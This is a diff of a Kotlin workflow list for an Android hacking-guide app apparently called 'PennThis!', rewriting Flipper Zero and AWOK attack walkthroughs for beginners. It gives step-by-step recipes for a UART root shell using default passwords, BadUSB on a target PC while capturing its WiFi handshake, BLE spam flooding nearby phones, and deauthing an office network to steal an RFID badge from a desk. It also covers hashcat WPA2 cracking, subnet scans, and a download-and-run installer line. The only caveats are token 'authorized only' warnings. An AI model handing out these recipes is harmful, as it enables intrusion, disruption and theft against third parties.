-            prerequisites = listOf("Flipper Zero", "Target device with UART pins exposed", "Jumper wires"),
+            prerequisites = listOf("Flipper Zero", "Jumper wires", "Target device with exposed UART pins (look for TX, RX, GND labels)"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Open USB-UART Bridge App",
-                    description = "Navigate to the GPIO UART bridge application.",
-                    commands = listOf(
-                        Command("Navigate", "Apps > GPIO > USB-UART Bridge", Device.FLIPPER_CLI)
-                    )
+                    title = "What Is UART?",
+                    description = "UART is a serial communication port that many devices (routers, cameras, printers) have exposed on their circuit board. If you connect to it during boot, you can get a root shell (command line) on the device — even without knowing the password.",
+                    tips = listOf("Look for 3-4 small pins labeled TX, RX, GND, VCC on circuit boards")
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Wire UART Connections",
-                    description = "Connect target device UART pins to Flipper GPIO:",
+                    title = "Wire It Up",
+                    description = "Connect jumper wires between your device and Flipper's GPIO pins:\n• Target TX → Flipper PIN 14 (RX)\n• Target RX → Flipper PIN 13 (TX)\n• Target GND → Flipper GND (any GND pin)\n\nDO NOT connect the 5V/3.3V pins unless you're sure the target is off.",
                     commands = listOf(
-                        Command("TX/RX wiring", "Target TX → Flipper RX (pin 14)\nTarget RX → Flipper TX (pin 13)\nTarget GND → Flipper GND", Device.FLIPPER_CLI)
+                        Command("Wiring guide", "Target TX → Flipper Pin 14\nTarget RX → Flipper Pin 13\nTarget GND → Flipper GND", Device.FLIPPER_CLI)
                     ),
-                    tips = listOf(
-                        "3.3V logic levels — do NOT connect 5V signals directly",
-                        "Some devices: target 5V TX → voltage divider → Flipper RX"
-                    )
+                    warning = "Use 3.3V logic only. 5V signals can destroy Flipper's GPIO pins"
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "Connect Flipper to Android",
-                    description = "Connect Flipper to Android via USB-C OTG cable. Opens virtual serial port.",
-                    tips = listOf(
-                        "Flipper presents as USB Serial device",
-                        "Use Serial Terminal app on Android (e.g., Serial USB Terminal)"
+                    title = "Open the UART Bridge App",
+                    description = "On Flipper: Apps → GPIO → USB-UART Bridge. This turns Flipper into a USB-to-serial converter.",
+                    commands = listOf(
+                        Command("Open bridge app", "Apps → GPIO → USB-UART Bridge", Device.FLIPPER_CLI)
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 4,
-                    title = "Set Baud Rate",
-                    description = "Match baud rate to target device in GPIO app. Common rates: 9600, 115200, 57600.",
+                    title = "Connect Flipper to Your Phone",
+                    description = "Plug Flipper into your phone via USB-C OTG adapter. Install 'Serial USB Terminal' from Google Play (it's free). Open it. Tap Connect. Set baud rate to 115200 (most common) or 9600.",
+                    tips = listOf("The app: 'Serial USB Terminal' by Kai Morich — works great, free")
+                ),
+                WorkflowStep(
+                    stepNumber = 5,
+                    title = "Reboot Target and Watch",
+                    description = "Power cycle the target device. Watch the terminal — you should see boot messages scrolling. On many routers and cameras, just pressing Enter at the right moment gives you a root shell.",
+                    tips = listOf(
+                        "Try pressing Enter repeatedly during boot",
+                        "Look for 'login:' prompt — default credentials are often admin/admin or root/root",
+                        "Some devices drop right into a root shell with no password!"
+                    )
+                )
+            )
+        ),
+
+        Workflow(
+            id = "awok_flipper_combo",
+            title = "Full Combo Attack: AWOK + Flipper Together",
+            subtitle = "Use both devices simultaneously for a layered wireless attack",
+            categoryId = "gpio",
+            hardware = listOf(Hardware.BOTH),
+            prerequisites = listOf("Flipper Zero with Momentum firmware", "AWOK Dual Mini v3 with Marauder", "AWOK connected to Flipper or phone"),
+            steps = listOf(
+                WorkflowStep(
+                    stepNumber = 1,
+                    title = "The Combo Strategy",
+                    description = "Here's the power of having both devices:\n\n🔵 AWOK handles: WiFi attacks, BLE spam, Bluetooth scanning\n🟠 Flipper handles: Sub-GHz, RFID, NFC, BadUSB, IR, iButton\n\nRun them at the same time for multi-layer attacks. Example: Flipper does BadUSB on a laptop while AWOK captures the WiFi handshake simultaneously.",
+                    tips = listOf("The devices are completely independent — they can run different attacks at the same time")
+                ),
+                WorkflowStep(
+                    stepNumber = 2,
+                    title = "Connect AWOK to Flipper",
+                    description = "Plug your AWOK into the Flipper's GPIO header (stacking connection) OR have AWOK plugged into your phone directly. Open Flipper → Apps → GPIO → [ESP32] WiFi Marauder to control AWOK through Flipper.",
                     commands = listOf(
-                        Command("Common baud", "115200, 9600, 57600, 38400", Device.FLIPPER_CLI)
+                        Command("Control AWOK through Flipper", "Apps → GPIO → [ESP32] WiFi Marauder", Device.FLIPPER_CLI)
+                    )
+                ),
+                WorkflowStep(
+                    stepNumber = 3,
+                    title = "Example: WiFi + BadUSB Attack",
+                    description = "SIMULTANEOUS ATTACK:\n1. On Flipper: load a BadUSB script and plug into target PC\n2. In WiFi Marauder (via Flipper or phone): run 'scanap' on the target's network\n3. While BadUSB runs on the PC, AWOK captures the network handshake\n\nResult: you get both keyboard-level access AND network capture at the same time.",
+                    warning = "Only perform on your own equipment"
+                ),
+                WorkflowStep(
+                    stepNumber = 4,
+                    title = "Example: BLE Spam + Sub-GHz Jam",
+                    description = "CHAOS MODE:\n1. Flipper: BLE Spam app flooding iOS/Android with notifications\n2. AWOK: blespam command also running\n3. Also play with Flipper Sub-GHz to intercept any RF signals in the area\n\nAll running at the same time from the same setup.",
+                    commands = listOf(
+                        Command("AWOK BLE spam", "blespam", Device.MARAUDER),
+                        Command("Flipper BLE Spam", "Apps → Bluetooth → BLE Spam", Device.FLIPPER_CLI)
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 5,
-                    title = "Interact with Serial Console",
-                    description = "Type commands to target device's serial console. Useful for: router serial console, Arduino debug, embedded system access.",
-                    tips = listOf(
-                        "Hold CTRL+C or send break to interrupt boot and access shell on some routers",
-                        "Many routers expose root shell via UART during boot"
-                    )
+                    title = "Example: RFID + Deauth Distraction",
+                    description = "SOCIAL ENGINEERING:\n1. AWOK: run deauth on the target office's WiFi (causes brief distraction/IT alert)\n2. Flipper: while they're distracted, swipe an RFID badge from a nearby desk and read it\n\nThe WiFi disruption = everyone's looking at their laptop → easier to get near a badge.",
+                    warning = "This combination workflow is for authorized red team testing only"
                 )
             )
         ),
 
-        Workflow(
-            id = "gpio_power",
-            title = "Power External Devices via GPIO",
-            subtitle = "Use Flipper GPIO pins to supply 3.3V or 5V to external hardware",
-            categoryId = "gpio",
-            hardware = listOf(Hardware.FLIPPER),
-            prerequisites = listOf("Flipper Zero", "External device needing power"),
-            steps = listOf(
-                WorkflowStep(
-                    stepNumber = 1,
-                    title = "3.3V Power Supply",
-                    description = "Flipper GPIO pin 9 = 3.3V, 50mA max. Good for: sensors, small MCUs.",
-                    commands = listOf(
-                        Command("Enable power", "power 3v3 1", Device.FLIPPER_CLI)
-                    )
-                ),
-                WorkflowStep(
-                    stepNumber = 2,
-                    title = "5V Power Supply",
-                    description = "Flipper GPIO pin 1 = 5V (from USB). Must be connected to USB power.",
-                    commands = listOf(
-                        Command("Enable 5V", "power 5v 1", Device.FLIPPER_CLI),
-                        Command("Disable 5V", "power 5v 0", Device.FLIPPER_CLI)
-                    ),
-                    tips = listOf(
-                        "5V pin only active when Flipper connected to USB",
-                        "Can power AWOK or small sensors"
-                    )
-                )
-            )
-        ),
+        // ── FLIPPER RPC ────────────────────────────────────────────────────────
 
         Workflow(
             id = "rpc_connect",
-            title = "Connect to Flipper via BLE RPC",
-            subtitle = "Control Flipper Zero programmatically via Bluetooth protobuf RPC",
+            title = "Control Flipper via Bluetooth from PennThis!",
+            subtitle = "Connect and send commands to Flipper wirelessly from the app",
             categoryId = "connect",
             hardware = listOf(Hardware.FLIPPER, Hardware.PHONE),
-            prerequisites = listOf("Flipper Zero with Bluetooth enabled", "FlipperGuide app"),
+            prerequisites = listOf("Flipper Zero with Bluetooth ON", "PennThis! app"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Enable Bluetooth on Flipper",
-                    description = "Turn on Bluetooth in Flipper settings.",
+                    title = "Turn On Flipper Bluetooth",
+                    description = "Settings → Bluetooth → Bluetooth → ON",
                     commands = listOf(
-                        Command("Enable BT", "Settings > Bluetooth > Bluetooth > ON", Device.FLIPPER_CLI)
+                        Command("Enable BT", "Settings → Bluetooth → Bluetooth → ON", Device.FLIPPER_CLI)
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Scan in FlipperGuide",
-                    description = "Open FlipperGuide app > Flipper RPC > tap 'Scan'. App finds Flipper BLE advertisement.",
-                    tips = listOf(
-                        "Flipper BLE name: 'Flipper [device_name]'",
-                        "Service UUID: 19ED82AE-ED21-4C9D-4145-228E62FE0000"
-                    )
+                    title = "Scan from PennThis!",
+                    description = "In this PennThis! app, tap the 'Connect Flipper' section in the left menu. Tap 'Scan for Flipper'. Your Flipper will appear in the list as 'Flipper [name]'. Tap it.",
+                    tips = listOf("Make sure your phone's Bluetooth is on and you've given the app Bluetooth permission")
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "Connect to Flipper",
-                    description = "Tap your Flipper in the scan list. App connects via GATT and establishes RPC channel.",
-                    tips = listOf(
-                        "BLE GATT connection uses protobuf message framing",
-                        "Same protocol as official mobile app"
-                    )
+                    title = "Connect",
+                    description = "Tap your Flipper in the list. The app connects via Bluetooth. You'll see the status change to Connected.",
+                    tips = listOf("First connection may take 5-10 seconds")
                 ),
                 WorkflowStep(
                     stepNumber = 4,
-                    title = "Available RPC Commands",
-                    description = "Once connected, available RPC operations:",
+                    title = "Available Commands",
+                    description = "Once connected, you can:\n• Ping — check if Flipper is responding\n• Device Info — see firmware version and device details\n• Reboot — remotely restart Flipper\n\nMore commands coming in future updates!",
                     commands = listOf(
-                        Command("Ping", "system_ping", Device.FLIPPER_CLI),
-                        Command("Device info", "system_device_info_request", Device.FLIPPER_CLI),
-                        Command("Reboot", "system_reboot_request", Device.FLIPPER_CLI),
-                        Command("List storage", "storage_list_request /ext", Device.FLIPPER_CLI),
-                        Command("Start app", "app_start_request [app_name]", Device.FLIPPER_CLI)
+                        Command("Ping Flipper", "Tap Ping button in app", Device.ANDROID),
+                        Command("Get device info", "Tap Device Info in app", Device.ANDROID)
                     )
                 )
             )
         ),
 
+        // ── TOOLS ──────────────────────────────────────────────────────────────
+
         Workflow(
             id = "tools_nethunter",
-            title = "Install Kali NetHunter in Termux",
-            subtitle = "Set up a full Kali Linux environment on Android without root",
+            title = "Install Kali Linux on Your Phone",
+            subtitle = "Get a full Kali Linux hacking environment in Termux — no root needed",
             categoryId = "tools",
             hardware = listOf(Hardware.PHONE),
-            prerequisites = listOf("Android phone", "Termux from F-Droid", "8GB free storage", "WiFi connection"),
+            prerequisites = listOf("Android phone", "8GB free storage", "Good WiFi connection (8GB download)", "Termux from F-Droid"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
                     title = "Install Termux from F-Droid",
-                    description = "Download and install Termux from F-Droid (NOT Google Play — Play version is outdated).",
-                    tips = listOf(
-                        "F-Droid: https://f-droid.org",
-                        "Search 'Termux' in F-Droid and install"
-                    )
+                    description = "Do NOT install Termux from Google Play — that version is outdated. Instead:\n1. Open your browser and go to: f-droid.org\n2. Tap 'Download F-Droid' and install the F-Droid app\n3. Open F-Droid, search for 'Termux', install it\n\nTermux is a Linux terminal that runs on Android.",
+                    tips = listOf("F-Droid = like an app store for open-source apps — totally safe")
                 ),
                 WorkflowStep(
                     stepNumber = 2,
                     title = "Setup Storage Access",
-                    description = "Run in Termux:",
+                    description = "Open Termux. Type this and press Enter:\ntermux-setup-storage\n\nA permission popup will appear — tap 'Allow'. This lets Termux read your SD card and Downloads folder.",
                     commands = listOf(
-                        Command("Setup storage", "termux-setup-storage", Device.TERMUX)
-                    ),
-                    tips = listOf("Grants /sdcard access — required for PCAP transfer")
+                        Command("Allow storage access", "termux-setup-storage", Device.TERMUX)
+                    )
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "Update Termux Packages",
-                    description = "Update all packages before installing NetHunter.",
+                    title = "Update Everything",
+                    description = "Type this and press Enter. Wait for it to finish (may take a few minutes):",
                     commands = listOf(
-                        Command("Update", "pkg update && pkg upgrade -y", Device.TERMUX)
+                        Command("Update packages", "pkg update && pkg upgrade -y", Device.TERMUX)
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 4,
-                    title = "Install Kali NetHunter",
-                    description = "Download and run the NetHunter rootless installer:",
+                    title = "Install Kali NetHunter Rootless",
+                    description = "Type this entire line and press Enter:",
                     commands = listOf(
                         Command("Install NetHunter", "pkg install wget curl -y && wget -O install-nethunter-termux https://offs.ec/2MceZWr && bash install-nethunter-termux", Device.TERMUX)
                     ),
                     tips = listOf(
-                        "~8GB download — use WiFi",
-                        "Takes 15-30 minutes",
-                        "Select 'full' installation for all tools"
+                        "This downloads 8GB of Kali Linux tools — use WiFi!",
+                        "Takes 20-40 minutes",
+                        "When it asks what to install: choose 'full' for everything",
+                        "You can use your phone normally during download"
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 5,
-                    title = "Launch Kali Environment",
-                    description = "Start the Kali NetHunter chroot environment.",
+                    title = "Launch Kali",
+                    description = "When installation finishes, type 'nethunter' and press Enter. You're now running Kali Linux on your Android phone!",
                     commands = listOf(
-                        Command("Launch Kali", "nethunter", Device.TERMUX),
-                        Command("Launch as root", "nethunter -r", Device.TERMUX)
+                        Command("Start Kali", "nethunter", Device.TERMUX)
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 6,
-                    title = "Verify Tool Installation",
-                    description = "Confirm key security tools are available.",
-                    commands = listOf(
-                        Command("Check nmap", "nmap --version", Device.TERMUX),
-                        Command("Check hashcat", "hashcat --version", Device.TERMUX)
-                    )
+                    title = "What Works Without Root",
+                    description = "These tools all work on your non-rooted Samsung Note 10+:\n• nmap (network scanner) ✓\n• hashcat (password cracker) ✓\n• python / python scripts ✓\n• curl / wget (web requests) ✓\n• netcat (network connections) ✓\n• tshark (read pcap files) ✓\n\nThese DON'T work without root:\n• Live WiFi capture (tcpdump, airmon-ng)\n• aircrack-ng for capture (can install but capture doesn't work)",
+                    tips = listOf("Your AWOK handles the WiFi captures — Termux just cracks the passwords!")
                 )
             )
         ),
 
         Workflow(
             id = "tools_hashcat",
-            title = "Crack WiFi Password with Hashcat",
-            subtitle = "Use hashcat in Termux to crack captured WPA2 handshakes",
+            title = "Crack WiFi Password with Hashcat in Termux",
+            subtitle = "Install hashcat and crack a captured WPA2 hash on your phone",
             categoryId = "tools",
             hardware = listOf(Hardware.PHONE),
-            prerequisites = listOf("Termux installed", "Captured .pcap file from Marauder", "Wordlist"),
+            prerequisites = listOf("Termux installed from F-Droid", "A .hc22000 file (converted from PCAP — see WiFi capture workflow)"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Install Hashcat",
-                    description = "Install hashcat via Termux package manager.",
+                    title = "Install hashcat",
+                    description = "Open Termux. Type:",
                     commands = listOf(
-                        Command("Install", "pkg install hashcat -y", Device.TERMUX)
-                    )
+                        Command("Install hashcat", "pkg install hashcat -y", Device.TERMUX)
+                    ),
+                    tips = listOf("hashcat IS available in Termux and works without root on Android")
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Download Wordlist",
-                    description = "Download rockyou.txt or other wordlist:",
+                    title = "Download a Password List",
+                    description = "Download the famous 'rockyou.txt' file — it contains 14 million real passwords people have used. If a password is in this list, hashcat will find it fast.",
                     commands = listOf(
-                        Command("Download rockyou", "wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt", Device.TERMUX)
+                        Command("Download rockyou wordlist", "curl -L -o ~/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt", Device.TERMUX)
                     ),
-                    tips = listOf(
-                        "rockyou.txt: 14 million common passwords",
-                        "SecLists has specialized WiFi wordlists"
-                    )
+                    tips = listOf("130MB file — use WiFi. Takes 2-5 minutes to download")
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "Transfer PCAP File",
-                    description = "Copy PCAP from Flipper SD card (/apps_data/marauder/pcaps/) to phone Downloads via USB."
+                    title = "Move Your Capture File to Termux",
+                    description = "Your .hc22000 file should be in your Downloads folder from the website conversion.\n\nIn Termux, copy it to your home folder:\ncp /sdcard/Download/capture.hc22000 ~/capture.hc22000\n\n(Replace 'capture.hc22000' with your actual file name)",
+                    commands = listOf(
+                        Command("Copy file to Termux home", "cp /sdcard/Download/capture.hc22000 ~/", Device.TERMUX)
+                    )
                 ),
                 WorkflowStep(
                     stepNumber = 4,
-                    title = "Convert PCAP to Hashcat Format",
-                    description = "Convert to hashcat format:",
+                    title = "Run the Password Crack",
+                    description = "Try dictionary attack first (fastest if password is common):",
                     commands = listOf(
-                        Command("Online convert", "https://hashcat.net/cap2hashcat/ — upload .pcap", Device.ANDROID),
-                        Command("If hcxtools available", "hcxpcapngtool -o out.hc22000 capture.pcap", Device.TERMUX)
-                    )
-                ),
-                WorkflowStep(
-                    stepNumber = 5,
-                    title = "Run Hashcat Attack",
-                    description = "Attack the captured hash with various modes.",
-                    commands = listOf(
-                        Command("Dictionary", "hashcat -m 22000 out.hc22000 ~/rockyou.txt", Device.TERMUX),
-                        Command("8-digit PIN", "hashcat -m 22000 out.hc22000 -a 3 ?d?d?d?d?d?d?d?d", Device.TERMUX),
-                        Command("8-char alpha", "hashcat -m 22000 out.hc22000 -a 3 ?l?l?l?l?l?l?l?l", Device.TERMUX),
-                        Command("Show result", "hashcat -m 22000 out.hc22000 --show", Device.TERMUX)
-                    )
-                ),
-                WorkflowStep(
-                    stepNumber = 6,
-                    title = "Advanced Attack Modes",
-                    description = "Use rules and hybrid masks for better coverage.",
+                        Command("Dictionary attack (most common passwords)", "hashcat -m 22000 ~/capture.hc22000 ~/rockyou.txt", Device.TERMUX),
+                        Command("Try all 8-digit numbers (like 12345678)", "hashcat -m 22000 ~/capture.hc22000 -a 3 ?d?d?d?d?d?d?d?d", Device.TERMUX),
+                        Command("Try all 8-digit+letter combos", "hashcat -m 22000 ~/capture.hc22000 -a 3 ?a?a?a?a?a?a?a?a", Device.TERMUX),
+                        Command("See if cracked", "hashcat -m 22000 ~/capture.hc22000 --show", Device.TERMUX)
+                    ),
                     tips = listOf(
-                        "Rules: hashcat -m 22000 hash.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
-                        "Mask attack variations: ?u?l?l?l?l?l?d?d (First cap, 6 lower, 2 digits)"
+                        "Rockyou dictionary: fast — seconds to minutes",
+                        "8-digit number brute force: about 30 minutes on phone",
+                        "8-char mixed brute force: could take days — better to use a PC for that"
                     )
                 )
             )
@@ -1724,60 +1489,69 @@ object WorkflowRepository {
 
         Workflow(
             id = "tools_termux_setup",
-            title = "Essential Termux Package Setup",
-            subtitle = "Install core security tools in Termux for Android pentesting",
+            title = "Set Up Termux Security Tools",
+            subtitle = "Install the best hacking tools in Termux — all work without root",
             categoryId = "tools",
             hardware = listOf(Hardware.PHONE),
             prerequisites = listOf("Termux from F-Droid", "Internet connection"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Install Core Packages",
-                    description = "Install essential security tools in one command.",
+                    title = "Update First",
+                    description = "Always update before installing anything:",
                     commands = listOf(
-                        Command("Install all", "pkg install nmap python curl wget python-pip tshark aircrack-ng -y", Device.TERMUX)
+                        Command("Update", "pkg update && pkg upgrade -y", Device.TERMUX)
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Install Python Libraries",
-                    description = "Install Python security libraries via pip.",
+                    title = "Install the Core Tools",
+                    description = "Install these tools that all work without root:",
                     commands = listOf(
-                        Command("Install scapy", "pip install scapy requests", Device.TERMUX)
+                        Command("Install tools (all work without root)", "pkg install nmap python python-pip curl wget tshark hashcat git -y", Device.TERMUX)
+                    ),
+                    tips = listOf(
+                        "nmap = network scanner (works without root using -sT flag)",
+                        "python = for custom scripts",
+                        "tshark = read/analyze pcap files (can't capture live without root — that's what your AWOK is for!)",
+                        "hashcat = crack passwords",
+                        "git = download tools from GitHub"
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "Verify nmap Works",
-                    description = "Test nmap with a connect scan (works without root).",
+                    title = "Install Python Libraries",
+                    description = "Install useful Python security libraries:",
                     commands = listOf(
-                        Command("Network scan", "nmap -sT -sV 192.168.1.0/24", Device.TERMUX)
-                    ),
-                    tips = listOf(
-                        "Use -sT (connect scan) NOT -sS (SYN scan requires root)",
-                        "Non-rooted device: -sT, -sV, -sn all work"
+                        Command("Install Python libs", "pip install scapy requests", Device.TERMUX)
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 4,
-                    title = "Read PCAP Files Without Root",
-                    description = "tshark can read existing capture files without root privileges.",
+                    title = "Scan Your Network",
+                    description = "Test that nmap works by scanning your local network. Important: use -sT not -sS (SYN scan requires root and won't work):",
                     commands = listOf(
-                        Command("Read pcap", "tshark -r capture.pcap", Device.TERMUX)
+                        Command("Scan your router and devices", "nmap -sT -sV 192.168.1.0/24", Device.TERMUX),
+                        Command("Just find alive hosts (fast)", "nmap -sn 192.168.1.0/24", Device.TERMUX)
                     ),
                     tips = listOf(
-                        "tshark can READ pcap files without root",
-                        "Cannot CAPTURE live traffic without root"
+                        "Change 192.168.1.0/24 to your actual network range — usually 192.168.0.0/24 or 192.168.1.0/24",
+                        "This shows every device on your WiFi network with open ports"
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 5,
-                    title = "View Active Network Connections",
-                    description = "Check active connections using tools that work without root.",
+                    title = "Read a PCAP File",
+                    description = "Once you have a .pcap file captured by AWOK, you can read it with tshark in Termux:",
                     commands = listOf(
-                        Command("Show connections", "ss -tulpn", Device.TERMUX),
-                        Command("Netstat", "netstat -an", Device.TERMUX)
+                        Command("Read pcap", "tshark -r /sdcard/Download/capture.pcap", Device.TERMUX),
+                        Command("Filter just WiFi handshakes", "tshark -r capture.pcap -Y 'eapol'", Device.TERMUX)
                     )
+                ),
+                WorkflowStep(
+                    stepNumber = 6,
+                    title = "What Doesn't Work Without Root",
+                    description = "Just so you know — these won't work:\n❌ airmon-ng (monitor mode needs root)\n❌ tcpdump -i (live capture needs root)\n❌ tshark -i (live capture needs root)\n❌ nmap -sS (SYN scan needs root)\n\nThat's why you need the AWOK — it handles all the captures!"
                 )
             )
         )
@@ -1818,14 +1592,14 @@ object WorkflowRepository {
                 id = "nfc",
                 title = "NFC 13.56MHz",
                 icon = "ic_nfc",
-                description = "MIFARE Classic attacks, card cloning",
+                description = "Clone hotel keycards and Amiibo figures",
                 workflowCount = countMap["nfc"] ?: 0
             ),
             Category(
                 id = "badusb",
                 title = "BadUSB",
                 icon = "ic_usb",
-                description = "HID keyboard attacks via USB or Bluetooth",
+                description = "Make Flipper type commands on any computer",
                 workflowCount = countMap["badusb"] ?: 0
             ),
             Category(
@@ -1839,35 +1613,35 @@ object WorkflowRepository {
                 id = "infrared",
                 title = "Infrared",
                 icon = "ic_ir",
-                description = "Universal remote, learn and replay signals",
+                description = "Universal remote, learn and replay any signal",
                 workflowCount = countMap["infrared"] ?: 0
             ),
             Category(
                 id = "ibutton",
                 title = "iButton",
                 icon = "ic_key",
-                description = "Dallas key cloning for intercoms and access",
+                description = "Clone metal contact keys for intercoms",
                 workflowCount = countMap["ibutton"] ?: 0
             ),
             Category(
                 id = "gpio",
-                title = "GPIO & Hardware",
+                title = "GPIO & Combos",
                 icon = "ic_gpio",
-                description = "Hardware hacking, UART bridge, serial tools",
+                description = "UART hacking and AWOK+Flipper combo attacks",
                 workflowCount = countMap["gpio"] ?: 0
             ),
             Category(
                 id = "connect",
-                title = "Flipper RPC",
+                title = "Flipper BT Control",
                 icon = "ic_link",
-                description = "Direct Bluetooth control via protobuf RPC",
+                description = "Control Flipper from PennThis! via Bluetooth",
                 workflowCount = countMap["connect"] ?: 0
             ),
             Category(
                 id = "tools",
-                title = "OS & Tools",
+                title = "Termux Tools",
                 icon = "ic_terminal",
-                description = "Kali NetHunter, hashcat, Termux setup",
+                description = "Kali Linux, hashcat, and Termux setup",
                 workflowCount = countMap["tools"] ?: 0
             )
         )
